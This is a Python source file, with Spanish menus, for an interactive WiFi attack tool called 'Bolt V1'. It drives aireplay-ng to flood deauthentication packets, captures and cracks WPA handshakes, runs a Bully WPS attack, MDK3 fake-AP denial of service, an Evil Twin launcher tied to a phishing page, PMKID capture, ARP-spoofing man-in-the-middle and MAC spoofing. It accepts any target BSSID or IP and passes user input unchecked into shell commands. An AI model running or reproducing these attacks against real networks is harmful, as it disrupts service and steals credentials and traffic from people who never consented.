import time
import sys
import os
import subprocess
import re
import random

OK = '\033[92m'
FAIL = '\033[91m'
WARNING = '\033[93m'
WHITE = '\033[1;37m'
BLUE = '\033[0;34m'
CYAN = '\033[0;36m'
ENDC = '\033[0m'

def generate_random_mac():
    return ':'.join(['%02x' % random.randint(0x00, 0xff) for _ in range(6)])

def change_mac(interface, new_mac):
    if not new_mac:
        new_mac = generate_random_mac()

    try:
        slowly(f"{WHITE}Bajando interfaz {interface}...{ENDC}")
        run_command(f"ifconfig {interface} down", check=True)
        
        slowly(f"{WHITE}Cambiando la MAC de {interface} a {new_mac}...{ENDC}")
        run_command(f"ifconfig {interface} hw ether {new_mac}", check=True)
        
        slowly(f"{WHITE}Subiendo interfaz {interface}...{ENDC}")
        run_command(f"ifconfig {interface} up", check=True)
        
        print(f"\n{OK}La dirección MAC se cambió a: {new_mac}{ENDC}")
        time.sleep(1)
        run_command(f"ifconfig {interface}", check=True)
        return True
    except:
        print(f"{FAIL}[ERROR]{ENDC} No se pudo cambiar la MAC. Asegúrese de que la interfaz exista y tenga permisos (sudo).")
        return False


def banner():
    os.system("clear")
    print(f"{FAIL}-------------------------------------------------{ENDC}")
    print(f"{WHITE}      HERRAMIENTA DE AUDITORÍA WIFI (Bolt V1)      {ENDC}")
    print(f"{OK}           Creado por Takizawa             {ENDC}")
    print(f"{FAIL}-------------------------------------------------{ENDC}")
    print(f"{CYAN}Opciones disponibles:{ENDC}")
    print(f"{WHITE} 1{ENDC}. Activar Modo Monitor")
    print(f"{WHITE} 2{ENDC}. Desactivar Modo Monitor")
    print(f"{WHITE} 3{ENDC}. Mostrar Interfaces de Red")
    print(f"{WHITE} 4{ENDC}. Reiniciar Servicios de Red")
    print(f"{WHITE} 5{ENDC}. Escaneo Airodump-ng (Guardar CSV)")
    print(f"{WHITE} 6{ENDC}. Capturar Handshake WPA/WPA2 (Ataque Deauth)")
    print(f"{WHITE} 7{ENDC}. Crackear Handshake con Aircrack-ng")
    print(f"{WHITE} 8{ENDC}. Ataque WPS con Bully")
    print(f"{WHITE} 9{ENDC}. Cambiar Dirección MAC")
    print(f"{WHITE} 10{ENDC}. Ataque DoS con MDK3 (Fake APs)")
    print(f"{FAIL}-------------------------------------------------{ENDC}")
    print(f"{WARNING}Funciones Avanzadas:{ENDC}")
    print(f"{WHITE} 11{ENDC}. Ataque Evil Twin (Requires Hostapd, DNSMASQ, etc.)")
    print(f"{WHITE} 12{ENDC}. Desautenticación Masiva (Flood)")
    print(f"{WHITE} 13{ENDC}. Cambiar a MAC Aleatoria (Ofuscación Rápida)")
    print(f"{FAIL}-------------------------------------------------{ENDC}")
    print(f"{CYAN}Nuevas Funciones Avanzadas:{ENDC}")
    print(f"{WHITE} 14{ENDC}. Test de Inyección de Paquetes (aireplay-ng -9)")
    print(f"{WHITE} 15{ENDC}. Escaneo de Redes Ocultas (SSID Oculto)")
    print(f"{WHITE} 16{ENDC}. Ataque de Captura PMKID (WPA3/WPA2 Rápido)")
    print(f"{WHITE} 17{ENDC}. Ataque de ARP Spoofing (Man-in-the-Middle)")
    print(f"{WHITE} 18{ENDC}. Ejecutar WIFITE (Ataque Automatizado Completo)")
    print(f"{FAIL}-------------------------------------------------{ENDC}")
    print(f"{WHITE} 0{ENDC}. Salir")
    print(f"{FAIL}-------------------------------------------------{ENDC}")

def slowly(s):
    try:
        time.sleep(0.5)
        for w in s + '\n':
            sys.stdout.write(w)
            sys.stdout.flush()
            time.sleep(7. / 100)
        print(ENDC)
        time.sleep(1)
    except KeyboardInterrupt:
        time.sleep(0.5)
        slowly(FAIL + 'Exiting...')
        sys.exit(0)

def goodbye():
    os.system("clear")
    slowly(f"\n{FAIL}[GOODBYE]{ENDC} Saliendo del programa...")
    sys.exit(0)

def run_command(command, shell=False, check=True):
    print(f"{CYAN}[EJECUTANDO] {command}{ENDC}")
    try:
        if shell:
            subprocess.run(command, shell=True, check=check, executable="/bin/bash")
        else:
            args = command.split()
            subprocess.run(args, check=check)
    except subprocess.CalledProcessError as e:
        print(f"{FAIL}[ERROR]{ENDC} El comando falló. Código de salida: {e.returncode}. Revise los permisos (sudo).")
        time.sleep(2)
    except FileNotFoundError:
        print(f"{FAIL}[ERROR]{ENDC} Comando no encontrado. Asegúrese de que la herramienta esté instalada y en el PATH.")
        time.sleep(2)
    except Exception as e:
        print(f"{FAIL}[ERROR]{ENDC} Ocurrió un error inesperado: {e}")
        time.sleep(2)

def main():
    while True:
        banner()
        
        try:
            print(f" {WHITE}Introduzca una opción: {ENDC}")
            WH = input(f" {OK}>> {WHITE}").strip()
            
            if not WH.isdigit():
                print(f"{FAIL}[ERROR]{ENDC} Opción no válida. Por favor, ingrese un número.")
                time.sleep(2)
                continue
            
            WH = int(WH)

        except EOFError:
            goodbye()
        except Exception:
            print(f"{FAIL}[ERROR]{ENDC} Error de entrada. Intente de nuevo.")
            time.sleep(2)
            continue

        if WH == 1:
            banner()
            print(f" {WHITE}Ingrese la interfaz: ({CYAN}wlan0 {FAIL}| {BLUE}wlan1{WHITE}){ENDC}")
            interfaz = input(f" {OK}>> {WHITE}").strip()
            if not interfaz: continue

            comando = f"airmon-ng start {interfaz} && airmon-ng check kill"
            run_command(comando, shell=True)
            slowly(f"{OK}Modo Monitor activado. Presione Enter para volver...{ENDC}")
            input()

        elif WH == 2:
            banner()
            print(f" {WHITE}Ingrese la interfaz en modo monitor: ({CYAN}wlan0mon {BLUE}| wlan1mon{WHITE}){ENDC}")
            interfaz = input(f" {OK}>> {WHITE}").strip()
            if not interfaz: continue

            comando = f"airmon-ng stop {interfaz}"
            run_command(comando)
            slowly(f"{OK}Modo Monitor desactivado. Presione Enter para volver...{ENDC}")
            input()
            
        elif WH == 3:
            os.system("clear")
            print(f"\n{WHITE}Mostrando interfaces de red (Requiere sudo/root)...{ENDC}\n")
            run_command("ifconfig", check=False)
            run_command("ip a", check=False)
            time.sleep(3)

        elif WH == 4:
            banner()
            slowly(f" {WHITE}Reiniciando red, por favor, espere...{ENDC}")
            comando = "service networking restart && systemctl start NetworkManager"
            run_command(comando, shell=True)
            print(f" {FAIL}Proceso finalizado!{ENDC}")
            time.sleep(2)

        elif WH == 5:
            banner()
            print(f" {WHITE}Ingrese la interfaz en modo monitor: ({CYAN}wlan0mon {BLUE}| wlan1mon{WHITE}){ENDC}")
            interfaz = input(f" {OK}>> {WHITE}").strip()
            if not interfaz: continue

            print(f"{WHITE}Ingrese el nombre del archivo de salida: (Ej: {FAIL}redes-output{ENDC}{WHITE}){ENDC}")
            archivo_salida = input(f" {OK}>> {WHITE}").strip()
            if not archivo_salida: continue

            os.makedirs("scan-output", exist_ok=True)
            
            comando = f"airodump-ng --write scan-output/{archivo_salida} --output-format csv {interfaz}"
            print(f"\n {FAIL}[AVISO] {WHITE}Escaneo iniciado. Cuando termine, presione {WHITE}CTRL + C{ENDC}")
            time.sleep(3)
            
            try:
                subprocess.run(comando, shell=True)
            except KeyboardInterrupt:
                print(f"\n\n {FAIL}[AVISO] {WHITE}Escaneo detenido, guardando resultados...{ENDC}")
                time.sleep(2)
            finally:
                time.sleep(1)
                print(f"\n{WHITE}Los datos se han guardado en: {CYAN}scan-output/{OK}{archivo_salida}*.csv{ENDC}")
                
                print(f"{WHITE}¿Desea volver al menú principal? ({OK}y{WHITE}/{FAIL}n{WHITE}):{ENDC}")
                volver = input(f" {OK}>> {WHITE}").strip().lower()
                if volver != 'y':
                    goodbye()

        elif WH == 6:
            banner()
            print(f" {WHITE}Ingrese la interfaz en modo monitor: ({CYAN}wlan0mon {BLUE}| wlan1mon{WHITE}){ENDC}")
            interfaz = input(f" {OK}>> {WHITE}").strip()
            if not interfaz: continue

            comando_scan = f"airodump-ng {interfaz}"
            print(f"\n {FAIL}[AVISO] {WHITE}Escaneo iniciado. Presione {WHITE}CTRL + C{ENDC} para detener y seleccionar objetivo.")
            time.sleep(2)
            
            try:
                subprocess.run(comando_scan, shell=True)
            except KeyboardInterrupt:
                print(f"\n{OK}Escaneo detenido.{ENDC}")

            print(f"\n Ingrese el {OK}BSSID{ENDC} del objetivo:")
            bssid = input(f" {OK}>> {WHITE}").strip()
            print(f"\n Ingrese el {OK}CHANNEL{ENDC} del objetivo:")
            channel = input(f" {OK}>> {WHITE}").strip()
            print(f"\n Ingrese la {OK}RUTA{ENDC} donde desea guardar el handshake (Ej: /root/handshake):")
            ruta = input(f" {OK}>> {WHITE}").strip()
            print(f"\n Ingrese el número de paquetes a desautenticar (Ej: 100):")
            paquetes = input(f" {OK}>> {WHITE}").strip()
            
            comando_capture = f"airodump-ng -c {channel} --bssid {bssid} -w {ruta} {interfaz}"
            comando_deauth = f"xterm -e aireplay-ng -0 {paquetes} -a {bssid} {interfaz}"

            print(f"\n{CYAN}[PASO 1] {WHITE}Lanzando ataque de Deautenticación (En nueva ventana/xterm)...{ENDC}")
            run_command(comando_deauth, shell=True, check=False) 
            
            print(f"\n{CYAN}[PASO 2] {WHITE}Iniciando captura de Handshake (En esta terminal). Presione {WHITE}CTRL + C{ENDC} para detener.")
            time.sleep(2)
            try:
                subprocess.run(comando_capture, shell=True)
            except KeyboardInterrupt:
                print(f"\n{OK}Captura de Handshake detenida.{ENDC}")
            
            time.sleep(2)

        elif WH == 7:
            banner()
            print(f" {WHITE}Ingrese la ruta del handshake ({CYAN}archivo.cap{WHITE}):{ENDC}")
            ruta = input(f" {OK}>> {WHITE}").strip()
            print(f" {WHITE}Ingrese la ruta del diccionario ({CYAN}/root/wordlist.txt{WHITE}):{ENDC}")
            diccionario = input(f" {OK}>> {WHITE}").strip()
            
            if not (ruta and diccionario): continue

            comando = f"aircrack-ng {ruta} -w {diccionario}"
            run_command(comando)
            print(f"\n{OK}Proceso finalizado. Revise el resultado de Aircrack-ng.{ENDC}")
            time.sleep(4)

        elif WH == 8:
            banner()
            print(f" {WHITE}Ingrese la interfaz en modo monitor: ({CYAN}wlan0mon {BLUE}| wlan1mon{WHITE}){ENDC}")
            interfaz = input(f" {OK}>> {WHITE}").strip()
            print(f" {WHITE}Ingrese el BSSID del AP:")
            bssid = input(f" {OK}>> {WHITE}").strip()
            print(f" {WHITE}Ingrese el canal del AP:")
            channel = input(f" {OK}>> {WHITE}").strip()
            print(f" {WHITE}Ingrese el ESSID del AP (opcional):")
            essid = input(f" {OK}>> {WHITE}").strip()
            
            if not (interfaz and bssid and channel): continue

            comando = f"bully {interfaz} -b {bssid} -c {channel} --force"
            if essid:
                comando += f" -e {essid}"

            print(f"\n {FAIL}[AVISO] {WHITE}Iniciando ataque Bully. Presione {WHITE}CTRL + C{ENDC} para detener.")
            time.sleep(2)
            try:
                subprocess.run(comando, shell=True)
            except KeyboardInterrupt:
                print(f"\n{OK}Ataque Bully detenido.{ENDC}")
            time.sleep(2)

        elif WH == 9:
            banner()
            print(f" {WHITE}Introduzca la interfaz: ({CYAN}wlan0 {BLUE}| wlan1{WHITE}){ENDC}")
            interface = input(f" {OK}>> {WHITE}").strip()
            print(f"{WHITE}Introduzca la nueva dirección MAC (Ej: 00:11:22:AA:BB:CC):{ENDC}")
            nuevaMAC = input(f" {OK}>> {WHITE}").strip()
            
            if not interface: continue

            change_mac(interface, nuevaMAC)
            time.sleep(4)

        elif WH == 10:
            banner()
            print(f" {WHITE}Introduzca la interfaz en modo monitor: ({CYAN}wlan0mon {BLUE}| wlan1mon{WHITE}){ENDC}")
            interface = input(f" {OK}>> {WHITE}").strip()
            print(f" {WHITE}Introduzca el canal (Ej: 6):")
            channel = input(f" {OK}>> {WHITE}").strip()
            
            if not (interface and channel): continue

            print(f" {WHITE}¿Desea crear un diccionario de AP falsas? [{OK}y{ENDC}/{FAIL}n{ENDC}]{WHITE}){ENDC}")
            crearDic = input(f" {OK}>> {WHITE}").strip().lower()
            
            if crearDic == 'y':
                print(f"\n{CYAN}[GENERADOR]{ENDC} Ejecutando AP_generator.sh (requiere sudo)...")
                run_command('bash AP_generator.sh', check=False)
            
            print(f"\n{WHITE} Ingrese la ruta del diccionario {ENDC}(default: {CYAN}./wordlist/fakeAP.txt{ENDC}): ")
            diccionario = input(f" {OK}>> {WHITE}").strip() or "./wordlist/fakeAP.txt"

            comando = f"mdk3 {interface} b -f {diccionario} -a -s 1000 -c {channel}"
            print(f"\n {FAIL}[AVISO] {WHITE}Ataque DoS con MDK3 iniciado. Presione {WHITE}CTRL + C{ENDC} para detener el ataque.")
            time.sleep(2)
            try:
                subprocess.run(comando, shell=True)
            except KeyboardInterrupt:
                print(f"\n{OK}Ataque MDK3 detenido.{ENDC}")

            time.sleep(2) 

        elif WH == 11:
            banner()
            slowly(f"{WARNING}[AVISO]{ENDC} Esta función requiere que Hostapd, DNSMASQ y la página de phishing estén configurados en su entorno. Ejecutará el script de Evil Twin (se asume que existe).")
            print(f" {WHITE}Ingrese la interfaz del Punto de Acceso (Ej: {CYAN}wlan0{WHITE}):{ENDC}")
            ap_interface = input(f" {OK}>> {WHITE}").strip()
            print(f" {WHITE}Ingrese la interfaz de internet (Ej: {CYAN}eth0{WHITE}):{ENDC}")
            internet_interface = input(f" {OK}>> {WHITE}").strip()
            print(f" {WHITE}Ingrese el ESSID (Nombre del AP Falso):{ENDC}")
            essid = input(f" {OK}>> {WHITE}").strip()

            if not (ap_interface and internet_interface and essid): continue
            
            comando = f"./evil_twin_script.sh {ap_interface} {internet_interface} {essid}"
            print(f"\n {FAIL}[AVISO] {WHITE}Iniciando Evil Twin. Presione {WHITE}CTRL + C{ENDC} para detener. Esto abrirá una nueva terminal (xterm).")
            time.sleep(2)
            
            run_command(f"xterm -e {comando}", shell=True, check=False)
            print(f"\n{OK}Ataque Evil Twin finalizado. Revise la terminal para resultados.{ENDC}")
            time.sleep(4)

        elif WH == 12:
            banner()
            print(f" {WHITE}Ingrese la interfaz en modo monitor: ({CYAN}wlan0mon {BLUE}| wlan1mon{WHITE}){ENDC}")
            interfaz = input(f" {OK}>> {WHITE}").strip()
            
            if not interfaz: continue

            print(f"\n {FAIL}[AVISO] {WHITE}Escaneo iniciado. Presione {WHITE}CTRL + C{ENDC} para detener y lanzar el ataque masivo.")
            time.sleep(2)

            comando_scan = f"airodump-ng {interfaz}"
            try:
                subprocess.run(comando_scan, shell=True)
            except KeyboardInterrupt:
                print(f"\n{OK}Escaneo detenido. Se requiere el BSSID del objetivo para el ataque.{ENDC}")

            print(f"\n Ingrese el {OK}BSSID{ENDC} del objetivo (Todos los clientes serán desconectados):")
            bssid_target = input(f" {OK}>> {WHITE}").strip()

            if not bssid_target: continue
            
            comando_deauth_massive = f"aireplay-ng -0 0 -a {bssid_target} {interfaz}"
            
            print(f"\n {FAIL}[PELIGRO] {WHITE}Iniciando Desautenticación Masiva (DoS). Presione {WHITE}CTRL + C{ENDC} para detener.")
            time.sleep(3)
            
            try:
                run_command(comando_deauth_massive)
            except KeyboardInterrupt:
                 print(f"\n{OK}Ataque de Desautenticación Masiva detenido.{ENDC}")
            time.sleep(2)


        elif WH == 13:
            banner()
            print(f" {WHITE}Introduzca la interfaz: ({CYAN}wlan0 {BLUE}| wlan1{WHITE}){ENDC}")
            interface = input(f" {OK}>> {WHITE}").strip()
            
            if not interface: continue
            
            nueva_mac_aleatoria = generate_random_mac()
            change_mac(interface, nueva_mac_aleatoria)
            time.sleep(4)
        
        # 14. Test de Inyección de Paquetes
        elif WH == 14:
            banner()
            print(f" {WHITE}Ingrese la interfaz en modo monitor: ({CYAN}wlan0mon {BLUE}| wlan1mon{WHITE}){ENDC}")
            interfaz = input(f" {OK}>> {WHITE}").strip()
            if not interfaz: continue
            
            slowly(f"{WARNING}[AVISO]{ENDC} Realizando test de inyección. Un resultado de 30/30 es ideal.")
            comando = f"aireplay-ng -9 {interfaz}"
            run_command(comando)
            slowly(f"{OK}Test de Inyección finalizado. Presione Enter para volver...{ENDC}")
            input()

        # 15. Escaneo de Redes Ocultas
        elif WH == 15:
            banner()
            print(f" {WHITE}Ingrese la interfaz en modo monitor: ({CYAN}wlan0mon {BLUE}| wlan1mon{WHITE}){ENDC}")
            interfaz = input(f" {OK}>> {WHITE}").strip()
            if not interfaz: continue

            comando = f"airodump-ng --essid {interfaz}"
            print(f"\n {FAIL}[AVISO] {WHITE}Escaneo iniciado. Buscando redes con ESSID oculto. Presione {WHITE}CTRL + C{ENDC} para detener.")
            time.sleep(3)

            try:
                subprocess.run(comando, shell=True)
            except KeyboardInterrupt:
                print(f"\n{OK}Escaneo detenido.{ENDC}")
            
            time.sleep(2)

        # 16. Ataque de Captura PMKID (WPA3/WPA2 Rápido)
        elif WH == 16:
            banner()
            slowly(f"{WARNING}[AVISO]{ENDC} Esta función requiere {CYAN}hcxdumptool{ENDC} y {CYAN}hcxhashtool{ENDC} instalados.")
            print(f" {WHITE}Ingrese la interfaz en modo monitor: ({CYAN}wlan0mon {BLUE}| wlan1mon{WHITE}){ENDC}")
            interfaz = input(f" {OK}>> {WHITE}").strip()
            print(f" {WHITE}Ingrese la ruta para guardar el hash ({CYAN}pmkid.pcapng{WHITE}):{ENDC}")
            output_file = input(f" {OK}>> {WHITE}").strip() or "pmkid.pcapng"
            
            if not interfaz: continue
            
            comando_capture = f"hcxdumptool -o {output_file} -i {interfaz} --enable_status=1"
            print(f"\n {FAIL}[AVISO] {WHITE}Iniciando captura de PMKID. Presione {WHITE}CTRL + C{ENDC} para detener y convertir el hash.")
            time.sleep(3)

            try:
                subprocess.run(comando_capture, shell=True)
            except KeyboardInterrupt:
                print(f"\n{OK}Captura detenida. Convirtiendo a formato Hashcat/JTR...{ENDC}")
                comando_convert = f"hcxhashtool -o {output_file}.hash -i {output_file}"
                run_command(comando_convert)
                print(f"\n{OK}PMKID guardado y convertido en {CYAN}{output_file}.hash{ENDC}.{ENDC}")

            time.sleep(4)

        # 17. Ataque de ARP Spoofing (Man-in-the-Middle)
        elif WH == 17:
            banner()
            slowly(f"{WARNING}[AVISO]{ENDC} Esta función requiere que esté conectado a la red. Se usará {CYAN}arpspoof{ENDC}.")
            print(f" {WHITE}Ingrese la interfaz de red (Ej: {CYAN}eth0 {BLUE}| wlan0{WHITE}):{ENDC}")
            interfaz = input(f" {OK}>> {WHITE}").strip()
            print(f" {WHITE}Ingrese la IP del Gateway (Ej: {CYAN}192.168.1.1{WHITE}):{ENDC}")
            gateway_ip = input(f" {OK}>> {WHITE}").strip()
            print(f" {WHITE}Ingrese la IP del Objetivo (Ej: {CYAN}192.168.1.100{WHITE}):{ENDC}")
            target_ip = input(f" {OK}>> {WHITE}").strip()

            if not (interfaz and gateway_ip and target_ip): continue

            slowly(f"{CYAN}[PASO 1] {WHITE}Activando IP Forwarding...{ENDC}")
            run_command("sysctl -w net.ipv4.ip_forward=1", shell=True)
            
            comando_target = f"xterm -e arpspoof -i {interfaz} -t {target_ip} {gateway_ip}"
            comando_gateway = f"xterm -e arpspoof -i {interfaz} -t {gateway_ip} {target_ip}"
            
            print(f"\n{CYAN}[PASO 2] {WHITE}Lanzando ARP Spoofing al Objetivo y Gateway (En nuevas ventanas xterm)...{ENDC}")
            run_command(comando_target, shell=True, check=False)
            run_command(comando_gateway, shell=True, check=False)

            slowly(f"\n{OK}ARP Spoofing en progreso. Cierre las ventanas para detener el ataque y presione Enter aquí para volver...{ENDC}")
            input()
            slowly(f"{CYAN}[PASO 3] {WHITE}Desactivando IP Forwarding...{ENDC}")
            run_command("sysctl -w net.ipv4.ip_forward=0", shell=True)
            time.sleep(2)

        # 18. Ejecutar WIFITE
        elif WH == 18:
            banner()
            slowly(f"{WARNING}[AVISO]{ENDC} Se requiere {CYAN}WIFITE{ENDC} instalado. WIFITE automatiza múltiples ataques.")
            print(f" {WHITE}Ingrese la interfaz en modo monitor: ({CYAN}wlan0mon {BLUE}| wlan1mon{WHITE}){ENDC}")
            interfaz = input(f" {OK}>> {WHITE}").strip()
            if not interfaz: continue
            
            comando = f"wifite --kill --dict /usr/share/wordlists/rockyou.txt -i {interfaz}"
            print(f"\n {FAIL}[AVISO] {WHITE}Iniciando WIFITE. El ataque se ejecuta automáticamente. Presione {WHITE}CTRL + C{ENDC} para detener.")
            time.sleep(3)
            
            try:
                subprocess.run(comando, shell=True)
            except KeyboardInterrupt:
                print(f"\n{OK}WIFITE detenido.{ENDC}")
            time.sleep(4)


        elif WH == 0:
            goodbye()
        
        else:
            print(f"{FAIL}[ERROR]{ENDC} Opción no reconocida. Intente de nuevo.")
            time.sleep(2)

if __name__ == "__main__":
    main()
